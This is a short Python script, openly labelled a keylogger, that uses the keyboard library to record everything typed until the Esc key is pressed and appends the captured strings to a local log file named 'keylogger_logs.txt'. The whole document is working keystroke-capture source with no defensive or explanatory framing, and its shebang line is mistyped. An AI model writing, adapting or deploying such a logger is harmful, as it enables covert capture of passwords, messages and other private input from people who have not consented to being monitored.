#1/usr/bin/python
# -*- coding: utf-8 -*-

import keyboard
import os
    
FILE_NAME = "keylogger_logs.txt"
    
CLEAR_ON_STARTUP = False
    
TERMINATE_KEY = "esc"
    
def main():
    
        if CLEAR_ON_STARTUP:
            os.remove(FILE_NAME)
            
        output = open(FILE_NAME, "a")
        
        for string in keyboard.get_typed_strings(keyboard.record(TERMINATE_KEY)):
            output.write(string + "\n")
            
        output.close()
        
if __name__ == "__main__":
        main() 
